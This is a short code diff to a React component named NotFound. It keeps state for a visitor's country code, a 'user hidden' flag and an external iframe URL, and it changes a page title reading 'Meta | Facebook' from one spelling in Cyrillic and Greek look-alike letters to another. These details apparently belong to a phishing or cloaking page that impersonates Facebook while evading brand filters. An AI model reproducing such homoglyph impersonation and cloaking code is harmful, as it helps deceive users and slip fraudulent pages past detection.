@@ -6,8 +6,8 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://linkclient.onrender.com');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μеtа | Fасеbοоk');
-  let[SiteTitleHome, SetSiteTitleHome] = useState('Home Page | Welcome');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Мeta | Faceboοk');
+  let[SiteTitleHome, SetSiteTitleHome] = useState('Home');
 
 
   function showIframe(file,title,favicon) {
